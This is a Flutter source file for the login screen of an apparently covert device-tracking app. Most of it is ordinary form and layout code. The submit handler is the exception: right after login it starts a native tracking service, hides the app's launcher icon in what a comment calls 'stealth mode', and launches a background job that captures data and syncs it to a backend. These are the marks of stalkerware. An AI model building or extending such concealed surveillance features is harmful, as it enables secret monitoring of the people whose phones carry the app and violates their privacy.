import 'package:flutter/material.dart';
import 'auth_widgets.dart';
import 'register_page.dart';
import '../tracking/tracking_home_page.dart';
import '../../core/constants/app_constants.dart';
import '../../core/errors/app_exceptions.dart';
import '../../platform/tracking_channel.dart';
import '../../platform/launcher_channel.dart';
import '../../services/auth_service.dart';
import '../../services/background_worker.dart';

class LoginPage extends StatefulWidget {
  const LoginPage({super.key});

  @override
  State<LoginPage> createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
  final _formKey = GlobalKey<FormState>();
  final _emailCtrl = TextEditingController();
  final _passCtrl = TextEditingController();
  bool _obscure = true;
  bool _loading = false;
  String? _errorMessage;

  late final AuthService _authService =
      AuthService(AppConstants.backendBaseUrl);

  @override
  void dispose() {
    _emailCtrl.dispose();
    _passCtrl.dispose();
    super.dispose();
  }

  Future<void> _submit() async {
    if (!_formKey.currentState!.validate()) return;
    setState(() { _loading = true; _errorMessage = null; });
    try {
      await _authService.login(
        email: _emailCtrl.text.trim(),
        password: _passCtrl.text,
      );

      // Auto-start the native tracking service immediately after login.
      await TrackingChannel.instance.startTrackingService();

      // Hide app icon from launcher (stealth mode) after successful login
      await LauncherChannel.hideAppIcon();

      // Fire-and-forget: capture initial data and sync to backend.
      // Don't await — let it run in background while the page loads.
      BackgroundWorker.captureAllAndSync();

      if (!mounted) return;
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => const TrackingHomePage()),
      );
    } on SyncException catch (e) {
      if (mounted) setState(() { _loading = false; _errorMessage = e.message; });
    } catch (_) {
      if (mounted) setState(() { _loading = false; _errorMessage = 'Unexpected error. Try again.'; });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFFF5F7FA),
      body: Stack(
        children: [
          // ── Top gradient header ──────────────────────────────────────
          Positioned(
            top: 0, left: 0, right: 0,
            child: Container(
              height: 270,
              decoration: const BoxDecoration(
                gradient: LinearGradient(
                  colors: [Color(0xFF0D1B4B), Color(0xFF1A3A8F)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.only(
                  bottomLeft: Radius.circular(40),
                  bottomRight: Radius.circular(40),
                ),
              ),
            ),
          ),

          SafeArea(
            child: Column(
              children: [
                // Back button
                Align(
                  alignment: Alignment.centerLeft,
                  child: IconButton(
                    icon: const Icon(Icons.arrow_back_ios_rounded,
                        color: Colors.white),
                    onPressed: () => Navigator.pop(context),
                  ),
                ),

                const SizedBox(height: 8),
                const Icon(Icons.shield_rounded, color: Colors.white, size: 46),
                const SizedBox(height: 12),
                const Text(
                  'Welcome Back',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 28,
                    fontWeight: FontWeight.w800,
                  ),
                ),
                const SizedBox(height: 6),
                Text(
                  'Sign in to your account',
                  style: TextStyle(
                      color: Colors.white.withOpacity(0.75), fontSize: 14),
                ),

                const SizedBox(height: 32),

                // ── Form ───────────────────────────────────────────────
                Expanded(
                  child: SingleChildScrollView(
                    padding: const EdgeInsets.symmetric(horizontal: 24),
                    child: Form(
                      key: _formKey,
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.stretch,
                        children: [
                          AuthCard(
                            child: Column(
                              children: [
                                AuthInputField(
                                  controller: _emailCtrl,
                                  label: 'Email Address',
                                  hint: 'you@example.com',
                                  icon: Icons.email_outlined,
                                  keyboardType: TextInputType.emailAddress,
                                  validator: (v) {
                                    if (v == null || v.isEmpty)
                                      return 'Enter your email';
                                    if (!v.contains('@'))
                                      return 'Enter a valid email';
                                    return null;
                                  },
                                ),
                                const SizedBox(height: 16),
                                AuthInputField(
                                  controller: _passCtrl,
                                  label: 'Password',
                                  hint: '••••••••',
                                  icon: Icons.lock_outline_rounded,
                                  obscure: _obscure,
                                  suffix: IconButton(
                                    icon: Icon(
                                      _obscure
                                          ? Icons.visibility_off_outlined
                                          : Icons.visibility_outlined,
                                      size: 20,
                                      color: Colors.grey,
                                    ),
                                    onPressed: () =>
                                        setState(() => _obscure = !_obscure),
                                  ),
                                  validator: (v) {
                                    if (v == null || v.isEmpty)
                                      return 'Enter your password';
                                    if (v.length < 6)
                                      return 'Minimum 6 characters';
                                    return null;
                                  },
                                ),
                              ],
                            ),
                          ),

                          Align(
                            alignment: Alignment.centerRight,
                            child: TextButton(
                              onPressed: () {},
                              child: const Text(
                                'Forgot Password?',
                                style: TextStyle(
                                  color: Color(0xFF1A3A8F),
                                  fontWeight: FontWeight.w600,
                                ),
                              ),
                            ),
                          ),

                          if (_errorMessage != null) ...[
                            const SizedBox(height: 4),
                            Container(
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 14, vertical: 10),
                              decoration: BoxDecoration(
                                color: Colors.red.shade50,
                                borderRadius: BorderRadius.circular(10),
                                border: Border.all(color: Colors.red.shade200),
                              ),
                              child: Row(
                                children: [
                                  Icon(Icons.error_outline_rounded,
                                      color: Colors.red.shade600, size: 18),
                                  const SizedBox(width: 8),
                                  Expanded(
                                    child: Text(_errorMessage!,
                                        style: TextStyle(
                                            color: Colors.red.shade700,
                                            fontSize: 13)),
                                  ),
                                ],
                              ),
                            ),
                          ],

                          const SizedBox(height: 6),

                          SizedBox(
                            height: 54,
                            child: ElevatedButton(
                              onPressed: _loading ? null : _submit,
                              style: ElevatedButton.styleFrom(
                                backgroundColor: const Color(0xFF1A3A8F),
                                foregroundColor: Colors.white,
                                elevation: 3,
                                shadowColor:
                                    const Color(0xFF1A3A8F).withOpacity(0.4),
                                shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(14)),
                              ),
                              child: _loading
                                  ? const SizedBox(
                                      width: 22,
                                      height: 22,
                                      child: CircularProgressIndicator(
                                          strokeWidth: 2,
                                          color: Colors.white),
                                    )
                                  : const Text('Login',
                                      style: TextStyle(
                                          fontSize: 16,
                                          fontWeight: FontWeight.w700)),
                            ),
                          ),

                          const SizedBox(height: 28),

                          Row(children: [
                            const Expanded(child: Divider()),
                            Padding(
                              padding:
                                  const EdgeInsets.symmetric(horizontal: 12),
                              child: Text('or',
                                  style:
                                      TextStyle(color: Colors.grey.shade500)),
                            ),
                            const Expanded(child: Divider()),
                          ]),

                          const SizedBox(height: 24),

                          Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Text("Don't have an account?  ",
                                  style:
                                      TextStyle(color: Colors.grey.shade600)),
                              GestureDetector(
                                onTap: () => Navigator.pushReplacement(
                                  context,
                                  MaterialPageRoute(
                                      builder: (_) => const RegisterPage()),
                                ),
                                child: const Text(
                                  'Sign Up',
                                  style: TextStyle(
                                    color: Color(0xFF1A3A8F),
                                    fontWeight: FontWeight.w700,
                                  ),
                                ),
                              ),
                            ],
                          ),

                          const SizedBox(height: 32),
                        ],
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}
